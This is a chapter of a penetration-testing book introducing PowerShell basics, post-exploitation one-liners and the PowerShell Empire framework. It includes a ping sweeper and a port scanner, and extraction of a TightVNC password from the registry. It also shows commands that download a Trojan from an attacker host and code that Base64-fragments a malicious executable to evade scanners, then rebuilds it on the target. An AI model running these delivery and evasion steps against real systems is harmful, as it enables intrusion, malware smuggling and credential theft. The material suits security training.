<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer213">
<h1 id="_idParaDest-166"><em class="italic"><a id="_idTextAnchor165"/>Chapter 9</em>: PowerShell Fundamentals</h1>
<p>Windows – it’s the operating system you love to hate. Or is it hate to love? Either way, it’s a divisive one among security professionals. Tell a total layperson to walk into a security conference and simply complain about Windows and he’s in like Flynn. No matter your position, one thing we can be sure of is its power. The landscape of assessing Windows environments changed dramatically in 2006 when PowerShell appeared on the scene. Suddenly, an individual Windows host had a sophisticated task automation and administration framework built right into it.</p>
<p>One of the important lessons of the post-exploitation activities in a penetration test is that we’re not always compromising a machine, nabbing the data out of it, and moving on; these days, even a low-value Windows foothold becomes an attack platform in its own right. One of the most dramatic ways to demonstrate this is by leveraging PowerShell from our foothold.</p>
<p>In this chapter, we will cover the following topics:</p>
<ul>
<li>Exploring PowerShell commands and the scripting language</li>
<li>Understanding basic post-exploitation with PowerShell</li>
<li>Introducing the PowerShell Empire framework</li>
<li>Exploring listener, stager, and agent concepts in PowerShell Empire</li>
</ul>
<h1 id="_idParaDest-167"><a id="_idTextAnchor166"/>Technical requirements</h1>
<p>The following are the operating system requirements for this chapter:</p>
<ul>
<li>Kali Linux</li>
<li>Windows 7 or 10</li>
</ul>
<h1 id="_idParaDest-168"><a id="_idTextAnchor167"/>Power to the shell – PowerShell fundamentals</h1>
<p>PowerShell is a command-line and scripting language framework for task automation and configuration <a id="_idIndexMarker679"/>management. I didn’t specify for Windows as, for a couple of years now, PowerShell has been cross-platform; however, it’s a Microsoft product. These days, it’s built into Windows, and despite its powerful potential for an attacker, it isn’t going to be fully blocked. For the Windows pen testers of today, it’s a comprehensive and powerful tool in their arsenal that just so happens to be installed on all of their victims’ PCs.</p>
<h2 id="_idParaDest-169"><a id="_idTextAnchor168"/>What is PowerShell?</h2>
<p>PowerShell can <a id="_idIndexMarker680"/>be a little overwhelming to understand when you first meet it, but ultimately, it’s just a fancy interface. PowerShell interfaces with providers, which allows you to access functionality that can’t easily be leveraged at the command line. In a way, they’re like hardware drivers – code that provides a way for software and hardware to communicate. Providers allow us to communicate with functionality and components of Windows from the command line.</p>
<p>When I described PowerShell as a task automation and configuration management framework, that’s more along the lines of Microsoft’s definition of PowerShell. As hackers, we think of what things can do, not necessarily how their creators defined them; in that sense, PowerShell is the Windows command line on steroids. It can do anything you’re used to doing in the standard Windows command shell. For example, fire up PowerShell and try using a good old-fashioned <strong class="source-inline">ipconfig</strong> command, as shown in the following screenshot:</p>
<div>
<div class="IMG---Figure" id="_idContainer186">
<img alt="Figure 9.1 – PowerShell can do everything CMD can do " height="509" src="image/Figure_9.1_B17616.jpg" width="810"/>
</div>
</div>
<p class="figure-caption">Figure 9.1 – PowerShell can do everything CMD can do</p>
<p>This works just fine. Now that we know what PowerShell lets us keep doing, let’s take a look at what makes it special.</p>
<p>For one, the standard Windows CMD is purely a Microsoft creation. Sure, the concept of a command <a id="_idIndexMarker681"/>shell isn’t unique to Windows, but how it’s implemented is unique as Windows has always done things in its own way. PowerShell, on the other hand, takes some of the best ideas from other shells and languages and brings them together. Have you ever spent a lot of time in Linux, and then accidentally typed <strong class="source-inline">ls</strong> instead of <strong class="source-inline">dir</strong> inside the Windows command line? What happens in PowerShell? Let’s see:</p>
<div>
<div class="IMG---Figure" id="_idContainer187">
<img alt="Figure 9.2 – Comparing dir with ls " height="450" src="image/Figure_9.2_B17616.jpg" width="756"/>
</div>
</div>
<p class="figure-caption">Figure 9.2 – Comparing dir with ls</p>
<p>That’s right – the <strong class="source-inline">ls</strong> command <a id="_idIndexMarker682"/>works in PowerShell, alongside the old-school <strong class="source-inline">dir</strong> and PowerShell’s <strong class="source-inline">Get-ChildItem</strong>. Let’s look closer at PowerShell’s native way of doing things: cmdlets.</p>
<h2 id="_idParaDest-170"><a id="_idTextAnchor169"/>PowerShell’s cmdlets and the PowerShell scripting language</h2>
<p>I had your <a id="_idIndexMarker683"/>attention when we talked about <strong class="source-inline">ls</strong> and <strong class="source-inline">dir</strong>, but you may have raised an eyebrow at <strong class="source-inline">Get-ChildItem</strong>. It sounds like something I’d put on my <a id="_idIndexMarker684"/>shopping list to remind myself to get a dinosaur toy for my kids (they’re really into dinosaurs right now). It’s one of PowerShell’s special ways of running <a id="_idIndexMarker685"/>commands called <strong class="bold">commandlets</strong> (<strong class="bold">cmdlets</strong>). A cmdlet is just a command, at least conceptually; behind the scenes, they’re .NET classes for implementing particular functionality. They’re the native bodies of commands within PowerShell and they use a unique self-explanatory syntax style: <em class="italic">verb-noun</em>. Before we go any further, let’s get familiar with the most important cmdlet of them all – <strong class="source-inline">Get-Help</strong>:</p>
<div>
<div class="IMG---Figure" id="_idContainer188">
<img alt="Figure 9.3 – The Get-Help cmdlet is always by your side " height="123" src="image/Figure_9.3_B17616.jpg" width="791"/>
</div>
</div>
<p class="figure-caption">Figure 9.3 – The Get-Help cmdlet is always by your side</p>
<p>By punching in <strong class="source-inline">Get-Help [</strong><em class="italic">cmdlet name</em><strong class="source-inline">]</strong>, you’ll find detailed information on the cmdlet, including example usage. The best part? It supports wildcards. Try using <strong class="source-inline">Get-Help Get*</strong> and note the following:</p>
<div>
<div class="IMG---Figure" id="_idContainer189">
<img alt="Figure 9.4 – Wildcards with cmdlets " height="360" src="image/Figure_9.4_B17616.jpg" width="1437"/>
</div>
</div>
<p class="figure-caption">Figure 9.4 – Wildcards with cmdlets</p>
<p><strong class="source-inline">Get-Help</strong> is pretty <a id="_idIndexMarker686"/>powerful, and we’re only scratching the surface. Now <a id="_idIndexMarker687"/>that we know how to get help along the way, let’s try some basic work with the Windows Registry.</p>
<h2 id="_idParaDest-171"><a id="_idTextAnchor170"/>Working with the Windows Registry</h2>
<p>Let’s work with a <strong class="source-inline">Get</strong> cmdlet to nab some data from the registry, and then convert it into a different <a id="_idIndexMarker688"/>format for our use. It just so happens that the machine I’ve attacked is running the TightVNC server, which stores an encrypted copy of the control password in the registry. This encryption is notoriously crackable, so let’s use PowerShell exclusively to grab the password in hexadecimal format, as follows:</p>
<p class="source-code">&gt; $FormatEnumerationLimit = -1</p>
<p class="source-code">&gt; Get-ItemProperty -Path registry::hklm\software\TightVNC\Server -Name ControlPassword</p>
<p class="source-code">&gt; $password = 139, 16, 57, 246, 188, 35, 53, 209</p>
<p class="source-code">&gt; ForEach ($hex in $password) {</p>
<p class="source-code">&gt;&gt; [Convert]::ToString($hex, 16) }</p>
<p>Let’s examine what we did here. First, I set the <strong class="source-inline">$FormatEnumerationLimit</strong> global variable to <strong class="source-inline">-1</strong>. As an experiment, try extracting the password without setting this variable first – what happens? The password gets cut off after 3 bytes. You can set <strong class="source-inline">$FormatEnumerationLimit</strong> to define how many bytes are displayed, with the default intention being space-saving. Setting it to <strong class="source-inline">-1</strong> is effectively saying <em class="italic">no limit</em>.</p>
<p>Next, we must issue the <strong class="source-inline">Get-ItemProperty</strong> cmdlet to extract the value from the registry. Note that we can use <strong class="source-inline">hklm</strong> as an alias for <strong class="source-inline">HKEY_LOCAL_MACHINE</strong>. Without <strong class="source-inline">-Name</strong>, it will display all of the values in the <strong class="source-inline">Server</strong> key. PowerShell will show us the properties of the requested item:</p>
<div>
<div class="IMG---Figure" id="_idContainer190">
<img alt="Figure 9.5 – Converting the decimal array into hex " height="434" src="image/Figure_9.5_B17616.jpg" width="1383"/>
</div>
</div>
<p class="figure-caption">Figure 9.5 – Converting the decimal array into hex</p>
<p>At this point, our job is technically complete – we wanted the <strong class="source-inline">ControlPassword</strong> value, and now <a id="_idIndexMarker689"/>we have it. There’s just one problem: the bytes are in base-10 (decimal). This is human-friendly, but not binary-friendly, so let’s convert the password with PowerShell. (Hey, we’re already here.) First, set a <strong class="source-inline">$password</strong> variable and separate the raw decimal values with commas. This tells PowerShell that you’re declaring an array. For fun, try setting the numbers inside quotation marks – what happens? The variable will then become a string with your numbers and commas, and <strong class="source-inline">ForEach</strong> is only going to see one item. Speaking of <strong class="source-inline">ForEach</strong>, that cmdlet is our last step – it defines a <strong class="source-inline">for-each</strong> loop (I told you these cmdlet names were self-explanatory) to conduct an operation on each item in the array. In this case, the operation is converting each value into base-16.</p>
<p>This is just one small example. PowerShell can be used to manipulate anything in the Windows operating system, including files and services. Remember that PowerShell can do anything the GUI can.</p>
<h2 id="_idParaDest-172"><a id="_idTextAnchor171"/>Pipelines and loops in PowerShell</h2>
<p>As I mentioned previously, PowerShell has the DNA of the best shells. You can dive right in with the <a id="_idIndexMarker690"/>tricks of the trade you’re already used to. Piping command output into a <strong class="source-inline">for</strong> loop? That’s kid’s stuff.</p>
<p>Take our <a id="_idIndexMarker691"/>previous example: we ended up with an array of decimal values and we need to convert each one into a hex. It should be apparent to even beginner programmers that this is an ideal <strong class="source-inline">for</strong> loop situation (for instance, <strong class="source-inline">ForEach</strong> in PowerShell). What’s great about pipelining in PowerShell is that you can pipe the object coming out of a cmdlet into another cmdlet, including <strong class="source-inline">ForEach</strong>. In other words, you can execute a cmdlet that outputs a list that is then piped into a <strong class="source-inline">for</strong> loop. Life is made even simpler with the single character alias for the <strong class="source-inline">ForEach</strong> cmdlet: <strong class="source-inline">%</strong>. Let’s take a look at an example. Both of these lines do the same thing:</p>
<p class="source-code">&gt; ls *.txt | ForEach-Object {cat $_}</p>
<p class="source-code">&gt; ls *.txt | % {cat $_}</p>
<p>If executed in a path with more than one text file, the <strong class="source-inline">ls *.txt</strong> command will produce a list of results; these are the input for <strong class="source-inline">ForEach-Object</strong>, with each item represented as <strong class="source-inline">$_</strong>.</p>
<p>There is technically a distinction between a <strong class="source-inline">for</strong> loop and a <strong class="source-inline">for-each</strong> loop, with the latter being a kind of <strong class="source-inline">for</strong> loop. A standard <strong class="source-inline">for</strong> loop essentially executes code a defined number of times, whereas the <strong class="source-inline">for each</strong> loop executes code for each item in an array or list.</p>
<p>We can define a number range with two periods (<strong class="source-inline">..</strong>). For example, <strong class="source-inline">5..9</strong> says to PowerShell, <strong class="source-inline">5, 6, 7, 8, 9</strong>. With this simple syntax, we can pipe ranges of numbers into a for loop this is handy for doing a task a set number of times, or even for using those numbers as arguments for a command. (I think I hear the hacker in you now – <em class="italic">we could make a PowerShell port scanner, couldn't we?</em> Come on, don’t spoil the surprise. Keep reading.) So, by piping a number range into <strong class="source-inline">ForEach</strong>, we can work with each number as <strong class="source-inline">$_</strong>. What do you think will happen if we run this command? Let’s see:</p>
<p class="source-code">&gt; 1..20 | % {echo "Hello, world! Here is number $_!"}</p>
<p>Naturally, we can build pipelines – a series of cmdlets passing output down the chain. For example, check out the following command:</p>
<p class="source-code">&gt; Get-Service Dhcp | Stop-Service -PassThru -Force | Set-Service -StartupType Disabled</p>
<p>Note that <a id="_idIndexMarker692"/>by defining the <strong class="source-inline">Dhcp</strong> service in the first cmdlet in the <a id="_idIndexMarker693"/>pipeline, <strong class="source-inline">Stop-Service</strong> and <strong class="source-inline">Set-Service</strong> already know what we’re working with.</p>
<p>I can hear you shouting from the back, “<em class="italic">what about an interactive scripting environment for more serious development?</em>” Say no more.</p>
<h2 id="_idParaDest-173"><a id="_idTextAnchor172"/>It gets better – PowerShell’s ISE</h2>
<p>One of the <a id="_idIndexMarker694"/>coolest things about PowerShell is the <strong class="bold">interactive scripting environment</strong> (<strong class="bold">ISE</strong>) that is built into the whole package. It features an interactive shell where you can run commands as you would in a normal shell session, as well as a coding window with syntax awareness and debugging features.</p>
<p>You can write up, test, and send scripts just like in any other programming experience:</p>
<div>
<div class="IMG---Figure" id="_idContainer191">
<img alt="Figure 9.6 – Windows PowerShell ISE " height="1187" src="image/Figure_9.6_B17616.jpg" width="1133"/>
</div>
</div>
<p class="figure-caption">Figure 9.6 – Windows PowerShell ISE</p>
<p>The file extension <a id="_idIndexMarker695"/>for any PowerShell script you write is <strong class="source-inline">ps1</strong>. Unfortunately, not all PowerShell installations are the same, and different versions of PowerShell have some differences; keep this in mind when you hope to run the <strong class="source-inline">ps1</strong> file you wrote on a given host.</p>
<p>This was a pleasant introduction to PowerShell basics, but now, we need to start understanding how PowerShell will be one of your favorite tools in your hacking bag.</p>
<h1 id="_idParaDest-174"><a id="_idTextAnchor173"/>Post-exploitation with PowerShell</h1>
<p>PowerShell is a full Windows administration framework, and it’s built into the operating system. It can’t be <a id="_idIndexMarker696"/>completely blocked. When we talk about post-exploitation in Windows environments, consideration of PowerShell is not a nice-to-have – it’s a necessity. We’ll examine the post phase in more detail in the last two chapters of this book, but for now, let’s introduce PowerShell’s role in bringing our attack to the next stage and one step closer to total compromise.</p>
<h2 id="_idParaDest-175"><a id="_idTextAnchor174"/>ICMP enumeration from a pivot point with PowerShell</h2>
<p>So, you have your foothold on a Windows 7 or 10 box. Setting aside the possibility of uploading <a id="_idIndexMarker697"/>our tools, can we use a plain off-the-shelf copy of Windows 7 or 10 to poke around for a potential next stepping stone? With PowerShell, there isn’t much we can’t do.</p>
<p>As we mentioned earlier, we can pipe a number range into <strong class="source-inline">ForEach</strong>. So, if we’re on a network with a netmask of <strong class="source-inline">255.255.255.0</strong>, our range could be 1 through 255 piped into a <strong class="source-inline">ping</strong> command. Let’s see it in action:</p>
<p class="source-code">&gt; 1..255 | % {echo "192.168.63.$_"; ping -n 1 -w 100 192.168.63.$_ | Select-String ttl}</p>
<p>As you can see, this will find results with the <strong class="source-inline">ttl</strong> string and thus, responses to the ping request:</p>
<div>
<div class="IMG---Figure" id="_idContainer192">
<img alt="Figure 9.7 – The quick ping sweeper " height="164" src="image/Figure_9.7_B17616.jpg" width="1263"/>
</div>
</div>
<p class="figure-caption">Figure 9.7 – The quick ping sweeper</p>
<p>Let’s stroll down the pipeline. First, we define a range of numbers: an inclusive array from 1 to 255. This is input to the <strong class="source-inline">ForEach</strong> alias, <strong class="source-inline">%</strong>, where we run an <strong class="source-inline">echo</strong> command and a <strong class="source-inline">ping</strong> command, using the current value in the loop as the last decimal octet for the IP address. As you already know, <strong class="source-inline">ping</strong> returns status information; this output is piped further down to <strong class="source-inline">Select-String</strong> to grep out the <strong class="source-inline">ttl</strong> string since this is one way of knowing we have a hit (we won’t see a TTL value unless a host responded to the ping request). Voilà – a PowerShell ping sweeper. It’s slow and crude, but we work with what is presented to us.</p>
<p>You might be wondering that if we have access to fire off PowerShell, why don’t we have access to a Meterpreter session and/or upload a toolset? Maybe, but maybe not – perhaps we have VNC access after cracking a weak password, but that isn’t a system compromise or presence on the domain. Another possibility is the insider threat – someone <a id="_idIndexMarker698"/>left a workstation open, we snuck up and sat down at their keyboard, and one of the few things we have time for is firing off a PowerShell one-liner. The pen tester must always maintain flexibility and keep an open mind.</p>
<p>You can imagine the next step after a ping sweep – looking for open ports, right from our PowerShell session.</p>
<h2 id="_idParaDest-176"><a id="_idTextAnchor175"/>PowerShell as a TCP-connect port scanner</h2>
<p>Now that <a id="_idIndexMarker699"/>we have a host in mind, we can learn more about it with the following one-liner, which is designed to attempt TCP connections to all specified ports:</p>
<p class="source-code">&gt; 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.63.147", $_)) "Open port - $_"} 2&gt;$null</p>
<p>Let’s see what this would look like after we do a quick ping sweep of a handful of hosts:</p>
<div>
<div class="IMG---Figure" id="_idContainer193">
<img alt="Figure 9.8 – The PowerShell port scan " height="335" src="image/Figure_9.8_B17616.jpg" width="1444"/>
</div>
</div>
<p class="figure-caption">Figure 9.8 – The PowerShell port scan</p>
<p>As you can see, this is just taking the basics we’ve learned about to the next level. <strong class="source-inline">1..1024</strong> defines our port range and pipes the array into <strong class="source-inline">%</strong>; with each iteration, a TCP client module is brought up to attempt a connection on the port. <strong class="source-inline">2&gt;$null</strong> blackholes <strong class="source-inline">STDERR</strong>; in other words, a returned error means the port isn’t open and the response is thrown in the trash.</p>
<p>We know from TCP and working with tools such as Nmap that there is a variety of port scanning strategies; for example, half-open scanning, where SYNs are sent to elicit the <strong class="source-inline">SYN-ACK</strong> response of an open port, but without completing the handshake with an <strong class="source-inline">ACK</strong> <strong class="bold">value</strong>. So, what is happening behind the scenes with our quick and dirty port scanner script? It’s a <strong class="source-inline">Connect</strong> module for <strong class="source-inline">TcpClient</strong> – it’s designed to create TCP connections. It doesn’t know that it’s being used for port scanning. It’s attempting to create full three-way <a id="_idIndexMarker700"/>handshakes and it will return successfully if the handshake is completed. We must understand what’s happening on the network.</p>
<p>Since we’re talking to the network, let’s see what we can get away with when we need to get malicious programs onto a target.</p>
<h2 id="_idParaDest-177"><a id="_idTextAnchor176"/>Delivering a Trojan to your target via PowerShell</h2>
<p>You have PowerShell access. You have a Trojan sitting on your Kali box that you need to deliver <a id="_idIndexMarker701"/>to the target. Here, you can host the file on your Kali box and use PowerShell to avoid pesky browser alerts and memory utilization.</p>
<p>First, we’re hosting the file with <strong class="source-inline">python -m SimpleHTTPServer 80</strong>, which is executed inside the folder containing the Trojan. When we’re ready, we can execute a PowerShell command that utilizes <strong class="bold">WebClient</strong> to download the file and write it to a local path:</p>
<p class="source-code">&gt; (New-Object System.Net.WebClient).DownloadFile("http://192.168.63.143/attack1.exe", "c:\windows\temp\attack1.exe")</p>
<p>Let’s see what this looks like when we execute it and run <strong class="source-inline">ls</strong> to validate:</p>
<div>
<div class="IMG---Figure" id="_idContainer194">
<img alt="Figure 9.9 – Downloading an EXE from an HTTP server " height="504" src="image/Figure_9.9_B17616.jpg" width="1442"/>
</div>
</div>
<p class="figure-caption">Figure 9.9 – Downloading an EXE from an HTTP server</p>
<p>It’s important to note that the destination path isn’t arbitrary; it must exist. This one-liner isn’t <a id="_idIndexMarker702"/>going to create a directory for you, so if you try to just throw it anywhere without confirming its presence on the host, you may pull an exception. Assuming this isn’t an issue, and the command has finished running, we can <strong class="source-inline">cd</strong> into the chosen directory and see our executable ready to go.</p>
<p>I know what you’re thinking, though – <em class="italic">pulling an EXE file from the network like this isn't exactly stealthy</em>. Right you are. Any endpoint protection product worth its salt will immediately nab this attempt. What we need to do is think about how we can smuggle the file in by converting it into something less suspicious than plain executable code. What if we converted our malicious binary into Base64? Then, we could write it into a plain text file, and PowerShell can treat it like an ordinary string. Let’s take a closer look.</p>
<h1 id="_idParaDest-178"><a id="_idTextAnchor177"/>Encoding and decoding binaries in PowerShell</h1>
<p>First, we’re <a id="_idIndexMarker703"/>going to <a id="_idIndexMarker704"/>switch back <a id="_idIndexMarker705"/>to our Kali box and create a <a id="_idIndexMarker706"/>quick executable bug with <strong class="source-inline">msfvenom.</strong> Then, we’re going to send it over to our Windows box by serving it up with <strong class="source-inline">SimpleHTTPServer</strong>:</p>
<div>
<div class="IMG---Figure" id="_idContainer195">
<img alt="Figure 9.10 – Building and serving the malicious executable " height="251" src="image/Figure_9.10_B17616.jpg" width="965"/>
</div>
</div>
<p class="figure-caption">Figure 9.10 – Building and serving the malicious executable</p>
<p>I’m calling <a id="_idIndexMarker707"/>this file <strong class="source-inline">sneaky.exe</strong> for this example. Now, let’s <a id="_idIndexMarker708"/>work our magic and read the raw <a id="_idIndexMarker709"/>bytes out of the EXE, compress the result, then <a id="_idIndexMarker710"/>convert it into Base64. Let’s get cracking:</p>
<p class="source-code">$rawData = [System.IO.File]::ReadAllBytes("C:\Users\bramw\Downloads\sneaky.exe")</p>
<p class="source-code">$memStream = New-Object IO.MemoryStream                </p>
<p class="source-code">$compressStream = New-Object System.IO.Compression.GZipStream ($memStream, [IO.Compression.CompressionMode]::Compress)</p>
<p class="source-code">$compressStream.Write($rawData, 0, $rawData.Length)</p>
<p class="source-code">$compressStream.Close()</p>
<p class="source-code">$compressedRaw = $memStream.ToArray()</p>
<p class="source-code">$b64Compress = [Convert]::ToBase64String($compressedRaw)</p>
<p class="source-code">$b64Compress | Out-File b64Compress.txt</p>
<p>Let’s examine what just happened step by step. Note that we’re using PowerShell to interact with .NET – tremendous power in a snap:</p>
<ol>
<li>Under the <strong class="source-inline">System.IO</strong> namespace, the <strong class="source-inline">File</strong> class contains the <strong class="source-inline">ReadAllBytes</strong> method. This simply opens a binary and reads the result into a byte array, which we are calling <strong class="source-inline">$rawData</strong>.</li>
<li>Next, we create a <strong class="source-inline">MemoryStream</strong> object called <strong class="source-inline">$memStream</strong>, where we’ll pack up the raw bytes using the <strong class="source-inline">GZipStream</strong> class. In other words, we’ll compress the contents of <strong class="source-inline">$rawData</strong> with the gzip file format specification.</li>
<li>Then, we create another array of raw bytes, <strong class="source-inline">$compressedRaw</strong>, but this time the data is our original byte array compressed with gzip.</li>
<li>Finally, we convert the compressed byte array into a Base64 string. At this point, we can treat <strong class="source-inline">$b64Compress</strong> like any other string; in our example, we wrote it into <a id="_idIndexMarker711"/>a text file.</li>
</ol>
<p>Now, you <a id="_idIndexMarker712"/>can open this text file just like you would <a id="_idIndexMarker713"/>any other plain text file. Why not write it on a napkin <a id="_idIndexMarker714"/>in crayon and give it to your buddies?</p>
<div>
<div class="IMG---Figure" id="_idContainer196">
<img alt="Figure 9.11 – Plain text Base64 representation of our binary " height="207" src="image/Figure_9.11_B17616.jpg" width="786"/>
</div>
</div>
<p class="figure-caption">Figure 9.11 – Plain text Base64 representation of our binary</p>
<p>The possibilities are limited by your imagination, but in our example, I served up the plain text to be fetched by my PowerShell script within the target environment. Let’s not underestimate the defenders: even though it’s ordinary text, it’s also obviously Base64 and it isn’t encrypted, so a quick scan would reveal its purpose. When I tried to email it to myself, Gmail was on to us, as shown in the following screenshot:</p>
<div>
<div class="IMG---Figure" id="_idContainer197">
<img alt="Figure 9.12 – Nice catch, Google! " height="347" src="image/Figure_9.12_B17616.jpg" width="705"/>
</div>
</div>
<p class="figure-caption">Figure 9.12 – Nice catch, Google!</p>
<p>Fear not, as <a id="_idIndexMarker715"/>this clever scan considered all the binary <a id="_idIndexMarker716"/>data. Snip off a few letters and it will end up mangled. Again, the possibilities are limited only by your imagination, but the idea is that you <a id="_idIndexMarker717"/>create a <em class="italic">jigsaw puzzle</em> made up of pieces <a id="_idIndexMarker718"/>of Base64 code that you will merely concatenate on the receiving end. In our example, let’s just snip off the first five characters from our text file and then serve the remaining characters on the network. Let’s take a look:</p>
<p class="source-code">Invoke-WebRequest -Uri "http://192.168.108.211:8000/sneaky.txt" -OutFile "fragment.txt"</p>
<p class="source-code">$fragment = Get-Content -Path "fragment.txt"</p>
<p class="source-code">$final = "H4sIA" + $fragment</p>
<p class="source-code">$compressedFromb64 = [Convert]::FromBase64String($final)</p>
<p class="source-code">$memoryStream = New-Object io.MemoryStream( , $compressedFromb64)          </p>
<p class="source-code">$compressStream = New-Object System.io.Compression.GZipStream($memoryStream, [io.Compression.CompressionMode]::Decompress)</p>
<p class="source-code">$finalStream = New-Object io.MemoryStream    </p>
<p class="source-code">$compressStream.CopyTo($finalStream)</p>
<p class="source-code">$DesktopPath = [Environment]::GetFolderPath("Desktop")</p>
<p class="source-code">$TargetPath = $DesktopPath + "\NotNaughty.exe"</p>
<p class="source-code">[IO.File]::WriteAllBytes($TargetPath, $finalStream.ToArray())</p>
<p>We can do all of this with fewer lines, but I laid it out like this so that we <a id="_idIndexMarker719"/>can see each stage of the attack. Once our script has <a id="_idIndexMarker720"/>pulled the fragment, we simply concatenate <a id="_idIndexMarker721"/>the missing piece and save it as <strong class="source-inline">$final</strong>. Thus, <strong class="source-inline">$final</strong> now contains Base64-encoded, gzip-compressed binary code in EXE format. We <a id="_idIndexMarker722"/>can use the same methods that we did previously in reverse, and then use the <strong class="source-inline">WriteAllBytes</strong> method to recreate the EXE on our end. Combine this trick with the malware evasion techniques we discussed previously in this book and you have yourself a powerful channel for smuggling your tools into the target environment.</p>
<p>Just as everything in Metasploit can be done manually, thankfully, we have a framework in our work bag that will ease the manual tasks of developing powerful PowerShell attacks. Let’s take a look at the Empire framework.</p>
<h1 id="_idParaDest-179"><a id="_idTextAnchor178"/>Offensive PowerShell – introducing the Empire framework</h1>
<p>The fact that we can sit down at a Windows box and use PowerShell to interact with the operating system so intimately <a id="_idIndexMarker723"/>is certainly a Windows administrator’s dream come true. As attackers, we see the parts for a precision-guided missile, and we only need the time to construct it. In a pen test, we just don’t have the time to write the perfect PowerShell script on the fly, so the average pen tester has a candy bag full of homegrown scripts for certain tasks. One of the scripts I used client after client did nothing more than poke around for open ports and dump the IP addresses into text files inside folders named after the open port. Things like that sound mundane and borderline pointless – until you’re out in the field and realize you’ve saved dozens of hours.</p>
<p>The advanced security professional sees tools such as Metasploit in this light – a framework for organized, efficient, and tidy delivery of our tools for when the built-in set doesn’t cut it. In the world of PowerShell, there is a framework that automates the task of staging and managing a communications channel with our target for sophisticated PowerShell attacks. Welcome to the Empire.</p>
<h2 id="_idParaDest-180"><a id="_idTextAnchor179"/>Installing and introducing PowerShell Empire</h2>
<p>Let’s introduce <a id="_idIndexMarker724"/>PowerShell Empire by taking a hands-on look at it. Installing it is a snap, but first, we’ll update <strong class="source-inline">apt</strong>:</p>
<div>
<div class="IMG---Figure" id="_idContainer198">
<img alt="Figure 9.13 – Installing PowerShell Empire on Kali " height="51" src="image/Figure_9.13_B17616.jpg" width="551"/>
</div>
</div>
<p class="figure-caption">Figure 9.13 – Installing PowerShell Empire on Kali</p>
<p>Once it’s been installed, you can start the team server with the following command:</p>
<p class="source-code">powershell-empire server</p>
<p>That’s right – red-teaming made easy with PowerShell Empire. Note the RESTful API hosted on port <strong class="source-inline">1337</strong>, as well – a lot of automation can be built with your favorite language, allowing you to do the work of many attackers from one PC on a tight schedule.</p>
<p>For now, let’s just fire up the Empire client in a new window:</p>
<p class="source-code">powershell-empire client</p>
<p>Notice anything in particular about this client interface?</p>
<div>
<div class="IMG---Figure" id="_idContainer199">
<img alt="Figure 9.14 – The client window for Empire " height="797" src="image/Figure_9.14_B17616.jpg" width="1208"/>
</div>
</div>
<p class="figure-caption">Figure 9.14 – The client window for Empire</p>
<p>That’s right – it has <a id="_idIndexMarker725"/>Metasploit’s look and feel. Check out the status above the prompt: it’s telling us that three principal components make Empire tick. These are <em class="italic">modules</em>, <em class="italic">listeners</em>, and <em class="italic">agents</em>. Though it isn’t displayed here, an equally important fourth component is <em class="italic">stagers</em>. These concepts will become clearer as we dive in, but let’s look at them in more detail:</p>
<ul>
<li>A <em class="italic">module</em> is <a id="_idIndexMarker726"/>essentially the same concept as a module in Metasploit – it’s a piece of code that conducts a particular task and serves as our attack’s payload.</li>
<li>A <em class="italic">listener</em> is <a id="_idIndexMarker727"/>self-explanatory: this will run on the local Kali machine and wait for the connection back from a compromised target.</li>
<li><em class="italic">Agents</em> are meant <a id="_idIndexMarker728"/>to reside on a target, which helps persist the connection between the attacker and the target. They take module commands to execute on the target.</li>
<li><em class="italic">Stagers</em> are the <a id="_idIndexMarker729"/>same as they are in Metasploit: pieces of code that set the stage for our module to run on the compromised host. Think of it as the communications broker between the attacker and the target.</li>
</ul>
<p>Let’s start <a id="_idIndexMarker730"/>with the most important command for first-time users – <strong class="source-inline">help</strong>:</p>
<div>
<div class="IMG---Figure" id="_idContainer200">
<img alt="Figure 9.15 – Empire’s help menu " height="631" src="image/Figure_9.15_B17616.jpg" width="1151"/>
</div>
</div>
<p class="figure-caption">Figure 9.15 – Empire’s help menu</p>
<p>Have you noticed that both PowerShell and PowerShell Empire make learning on the go easy? You can fire off <strong class="source-inline">help</strong> at any time to see the supported commands and learn more about them. Did you notice that 396 modules were loaded? You can quickly review those as well – type <strong class="source-inline">usemodule</strong> with a space on the end and use the arrow keys to browse the list:</p>
<div>
<div class="IMG---Figure" id="_idContainer201">
<img alt="Figure 9.16 – Autocomplete in Empire " height="170" src="image/Figure_9.16_B17616.jpg" width="1156"/>
</div>
</div>
<p class="figure-caption">Figure 9.16 – Autocomplete in Empire</p>
<p>Note the overlap with Metasploit in both module tree layout and even functionality. What distinguishes Empire, then? Well, you know how I feel about just telling you when we could be <a id="_idIndexMarker731"/>looking at the PowerShell scripts ourselves, right?</p>
<p>In a new window, use <strong class="source-inline">cd Empire/data/module_source/credentials</strong> to change to the credentials module’s source directory, and then list the contents with <strong class="source-inline">ls</strong>:</p>
<div>
<div class="IMG---Figure" id="_idContainer202">
<img alt="Figure 9.17 – Taking a peek at the raw scripts " height="228" src="image/Figure_9.17_B17616.jpg" width="1132"/>
</div>
</div>
<p class="figure-caption">Figure 9.17 – Taking a peek at the raw scripts</p>
<p>Check it out: <strong class="source-inline">.ps1</strong> files. Let’s crack one open. Execute <strong class="source-inline">vim dumpCredStore.ps1</strong>:</p>
<div>
<div class="IMG---Figure" id="_idContainer203">
<img alt="Figure 9.18 – Taking a peek inside a credentials nabber script " height="414" src="image/Figure_9.18_B17616.jpg" width="1002"/>
</div>
</div>
<p class="figure-caption">Figure 9.18 – Taking a peek inside a credentials nabber script</p>
<p>These are quite sophisticated and powerful PowerShell scripts. Now, I know what the hacker in <a id="_idIndexMarker732"/>you is saying – “<em class="italic">Just as we wrote up modules for Metasploit in Ruby, I can write up some PowerShell scripts and incorporate them into my attacks with Empire</em>.” Jolly well done. I leave that exercise to you because we need to get back to learning how to set up an Empire attack with listeners, stagers, and agents.</p>
<h2 id="_idParaDest-181"><a id="_idTextAnchor180"/>Configuring listeners</h2>
<p>In theory, you could start working on, say, an agent right off the bat. You can’t get anywhere <a id="_idIndexMarker733"/>without a listener, though. You shouldn’t venture out into the jungle without a way to get back home. From the main Empire prompt, type <strong class="source-inline">listeners</strong> and hit <em class="italic">Enter</em>:</p>
<div>
<div class="IMG---Figure" id="_idContainer204">
<img alt="Figure 9.19 – The listeners interface " height="171" src="image/Figure_9.19_B17616.jpg" width="736"/>
</div>
</div>
<p class="figure-caption">Figure 9.19 – The listeners interface</p>
<p>Note that this changes the prompt; the CLI uses an iOS-like style for entering configuration modes. You’re now in <strong class="source-inline">listeners</strong> mode, so typing <strong class="source-inline">help</strong> again will show you the <strong class="source-inline">listeners</strong> help menu.</p>
